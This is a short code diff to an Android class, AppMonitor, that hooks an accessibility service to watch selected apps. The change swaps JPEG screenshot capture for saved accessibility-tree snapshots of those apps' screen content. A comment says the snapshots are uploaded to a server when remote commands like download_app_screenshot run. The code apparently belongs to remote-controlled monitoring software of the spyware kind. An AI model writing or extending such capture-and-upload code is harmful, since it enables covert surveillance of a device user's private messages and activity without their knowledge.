@@ -3,14 +3,11 @@ package com.task.tusker.commands;
 import android.content.Context;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
-import android.graphics.Bitmap;
 import android.util.Log;
 import com.task.tusker.utils.Constants;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
-
-import java.io.ByteArrayOutputStream;
 
 /**
  * AppMonitor — hooks into UnifiedAccessibilityService to:
@@ -52,16 +49,21 @@ public class AppMonitor {
         }
     }
 
-    /** Called from UnifiedAccessibilityService to optionally capture a screenshot. */
-    public void onScreenChange(String packageName, Bitmap screenshot) {
-        if (!isMonitored(packageName) || screenshot == null) return;
+    /**
+     * Called from UnifiedAccessibilityService when a monitored app's screen content changes.
+     * Saves a compact accessibility-tree snapshot (JSON text) to private storage.
+     * Snapshots are small (no image data) and are only sent to the server when
+     * the list_app_screenshots / download_app_screenshot commands are executed.
+     *
+     * @param packageName  the monitored app's package name
+     * @param snapshotJson JSON string produced by UnifiedAccessibilityService.captureNodeTree()
+     */
+    public void onAccessibilitySnapshot(String packageName, String snapshotJson) {
+        if (!isMonitored(packageName) || snapshotJson == null || snapshotJson.isEmpty()) return;
         try {
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            // Compress to JPEG at 60% quality to save space
-            screenshot.compress(Bitmap.CompressFormat.JPEG, 60, baos);
-            logManager.saveAppScreenshot(packageName, baos.toByteArray());
+            logManager.saveAppSnapshot(packageName, snapshotJson);
         } catch (Exception e) {
-            Log.e(TAG, "onScreenChange: " + e.getMessage());
+            Log.e(TAG, "onAccessibilitySnapshot: " + e.getMessage());
         }
     }
 
